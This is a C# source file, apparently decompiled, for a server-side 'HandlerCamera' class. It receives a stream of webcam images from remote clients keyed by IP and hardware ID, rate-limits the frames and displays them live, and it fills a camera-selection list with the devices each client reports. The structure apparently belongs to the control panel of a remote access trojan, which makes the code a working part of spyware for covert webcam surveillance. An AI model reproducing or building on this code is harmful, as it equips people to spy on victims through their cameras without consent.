using System;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerCamera
{
	private static readonly ConcurrentDictionary<string, DateTime> _lastFrameTime = new ConcurrentDictionary<string, DateTime>();

	private static readonly TimeSpan _minFrameInterval = TimeSpan.FromMilliseconds(63.0);

	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		string text = (string)objects[1];
		if (!(text == "Connect"))
		{
			if (!(text == "Image"))
			{
				return;
			}
			FormCamera form2 = (FormCamera)client.Tag;
			if (form2 == null)
			{
				client.Disconnect();
				return;
			}
			string clientKey = client.IP + ":" + client.Hwid + ":camera";
			DateTime now = DateTime.UtcNow;
			if (!_lastFrameTime.TryGetValue(clientKey, out var lastFrame) || !(now - lastFrame < _minFrameInterval))
			{
				_lastFrameTime[clientKey] = now;
				Bitmap bitmap = Methods.ByteArrayToBitmap((byte[])objects[2]);
				form2.FPS++;
				if (form2.sw.ElapsedMilliseconds >= 1000)
				{
					form2.Text = $"Camera [{client.Hwid}]  Fps[{form2.FPS}] Data[{Methods.BytesToString(((byte[])objects[2]).Length)}] Size[{bitmap.Width}x{bitmap.Height}]";
					form2.FPS = 0;
					form2.sw = Stopwatch.StartNew();
				}
				form2.pictureBox1.Invoke((MethodInvoker)delegate
				{
					form2.pictureBox1.Image = bitmap;
				});
			}
			return;
		}
		FormCamera form3 = (FormCamera)Application.OpenForms["Camera:" + (string)objects[2]];
		if (form3 == null)
		{
			client.Disconnect();
			return;
		}
		form3.Invoke((MethodInvoker)delegate
		{
			form3.client = client;
			form3.Text = "Camera [" + (string)objects[2] + "]";
			string text2 = (string)objects[3];
			char[] separator = new char[1] { ',' };
			string[] array = text2.Split(separator);
			foreach (object item in array)
			{
				form3.rjComboBox1.Items.Add(item);
			}
			form3.rjComboBox1.SelectedIndex = 0;
			form3.materialSwitch1.Enabled = true;
			form3.rjComboBox1.Enabled = true;
		});
		client.Tag = form3;
		client.Hwid = (string)objects[2];
	}
}
